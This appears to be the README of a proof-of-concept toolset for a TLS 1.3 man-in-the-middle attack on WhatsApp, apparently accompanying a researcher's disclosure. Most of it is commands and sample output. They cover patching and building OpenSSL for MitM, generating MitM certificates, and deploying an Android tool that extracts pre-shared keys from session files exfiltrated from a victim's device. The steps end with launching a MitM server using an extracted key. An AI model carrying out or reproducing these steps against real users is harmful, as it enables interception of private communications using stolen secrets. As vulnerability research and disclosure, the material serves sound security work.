# TLS v1.3 (WaTLS) MitM toolset for WhatsApp

This directory contains the tooling required for performing TLS v1.3 (WaTLS)
MitM against WhatsApp.


## Preparation

In the following we assume environment variable `$POC` points to the root
directory of this repository.

Download OpenSSL 1.1.1f source code, apply TLS v1.3 MitM patch and compile:

    cd /tmp
    curl -O https://ftp.openssl.org/source/old/1.1.1/openssl-1.1.1f.tar.gz
    tar -zxvf openssl-1.1.1f.tar.gz
    mv openssl-1.1.1f openssl-1.1.1f-watls
    cd openssl-1.1.1f-watls
    patch -p1 < $POC/openssl-1.1.1f-patches/watls-mitm.patch
    ./config -d no-shared
    make -j8

Generate server certificate and keys for MitM:

    cd $POC/secrets
    ./gen_certs.sh

Prepare environment variables:

    export OPENSSL_SRC=/tmp/openssl-1.1.1f-watls
    export SECRETS=$POC/secrets

Your current directory should now be `$POC/watls_psk_extract`.

Now, we need to build a simple Android command line application that will be
used to extract PSKs from WaTLS serialized session files, exfiltrated from a
victim's device. This process requires access to the WhatsApp APK, so, (1) it
must be carried out on an Android device and (2) WhatsApp needs to be installed
on that device.

Fist, set `SDK_DIR` to the directory of the Android SDK, and `JAVA_HOME` to the
location of the Java compiler and call `make`:

    export SDK_DIR=/opt/android-sdk
    export JAVA_HOME=/usr
    make

To deploy the application on an Android device:

    # Required only if you have multiple devices attached on your computer
    export ANDROID_SERIAL=0123456789abcdef

    make deploy

To make sure deployment was successful:

    $ cd /data/local/tmp/watls_psk_extract
    $ ls -la
    total 22
    drwxrwxrwx  2 shell shell 3488 2021-03-12 13:42 .
    drwxrwx--x 11 shell shell 3488 2021-03-12 13:42 ..
    -rw-rw-rw-  1 shell shell 8212 2021-03-12 13:42 classes.dex
    -rwxrwxrwx  1 shell shell  235 2021-02-11 16:52 run.sh


## Usage

Generally, the workflow consists of the following steps:

* Serialized session files are exfiltrated during the *information gathering*
  phase, as described in our blog post

* The serialized session files are uploaded on the attacker's device using
  `adb push`

* The abovementioned Android application is used, on the attacker's device, in
  order to extract the PSKs from the serialized session files

* The PSKs are used to start an OpenSSL `s_server` instance for performing the MitM

To begin with, let's assume that during the information gathering phase,
**session.bin** was exfiltrated from the victim's device.

Upload it on your own device:

    adb push session.bin /data/local/tmp/watls_psk_extract

Extract the PSK:

    $ adb shell
    $ cd /data/local/tmp/watls_psk_extract
    $ ./run.sh session.bin
    [*] Extract PSKs from WaTLS session session.bin
    [*] Top-level SNI media-sof1-1.cdn.whatsapp.net
    [*] Id 8f SNI media-sof1-1.cdn.whatsapp.net PSK 6c017db24058a02460f75acd6084d195edb21529687a73c89d562e6f6c77a62f

Last but not least, run the following script to start the MitM server and pass
it the extracted PSK:

    ./run_server.sh 6c017db24058a02460f75acd6084d195edb21529687a73c89d562e6f6c77a62f

